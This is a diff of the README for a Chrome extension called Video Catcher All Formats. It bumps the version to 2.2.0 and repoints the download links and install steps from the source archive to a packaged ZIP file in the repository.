@@ -5,14 +5,14 @@
 
 ![Video Catcher Logo](assets/logo.svg)
 
-[![Version](https://img.shields.io/badge/version-2.1.0-8b5cf6?style=for-the-badge)](#)
+[![Version](https://img.shields.io/badge/version-2.2.0-8b5cf6?style=for-the-badge)](#)
 [![MV3](https://img.shields.io/badge/Chrome-Manifest%20V3-171327?style=for-the-badge&logo=googlechrome)](#)
 [![License](https://img.shields.io/badge/license-MIT-8b5cf6?style=for-the-badge)](LICENSE)
 [![Package](https://github.com/MoonDevil1/Video-Catcher-All-Formats/actions/workflows/package.yml/badge.svg)](https://github.com/MoonDevil1/Video-Catcher-All-Formats/actions/workflows/package.yml)
 
-<a href="https://github.com/MoonDevil1/Video-Catcher-All-Formats/archive/refs/heads/main.zip"><img alt="Download ZIP" src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_DOWNLOAD-ZIP_FILE-8b5cf6?style=for-the-badge&logo=github&logoColor=white"></a>
+<a href="https://github.com/MoonDevil1/Video-Catcher-All-Formats/raw/refs/heads/main/downloads/Video-Catcher-All-Formats-v2.2.0.zip"><img alt="Download ZIP" src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_DOWNLOAD-ZIP_FILE-8b5cf6?style=for-the-badge&logo=github&logoColor=white"></a>
 
-**[⬇️ Download Video Catcher All Formats — ZIP](https://github.com/MoonDevil1/Video-Catcher-All-Formats/archive/refs/heads/main.zip)**
+**[⬇️ Download Video Catcher All Formats — ZIP](https://github.com/MoonDevil1/Video-Catcher-All-Formats/raw/refs/heads/main/downloads/Video-Catcher-All-Formats-v2.2.0.zip)**
 
 _Unzip the download, then install through Chrome → Extensions → Developer mode → Load unpacked._
 
@@ -38,7 +38,7 @@ _Unzip the download, then install through Chrome → Extensions → Developer mo
 
 ## 🚀 Installation
 
-1. Download this repository ZIP using **Code → Download ZIP**.
+1. Click the **DOWNLOAD ZIP FILE** button above to download the packaged extension (not the full source repository).
 2. Extract the ZIP. Open `chrome://extensions` in desktop Chrome (or the equivalent page in Edge/Brave).
 3. Enable **Developer mode**, click **Load unpacked**, and select the folder containing `manifest.json`.
 4. Open a page with media, start playback, and click the extension icon.
@@ -80,7 +80,7 @@ Downloads of direct media preserve the file's **original video and audio streams
 
 ## 📦 Download ZIP
 
-Open [GitHub Actions](https://github.com/MoonDevil1/Video-Catcher-All-Formats/actions/workflows/package.yml), select a successful **Build extension** run, and download its ZIP artifact. Extract the ZIP before using **Load unpacked**.
+**[⬇️ Download the latest extension ZIP (v2.2.0)](https://github.com/MoonDevil1/Video-Catcher-All-Formats/raw/refs/heads/main/downloads/Video-Catcher-All-Formats-v2.2.0.zip)**. Extract it before using **Load unpacked**. GitHub Actions also produces build artifacts.
 
 ## 🛠️ Development
 
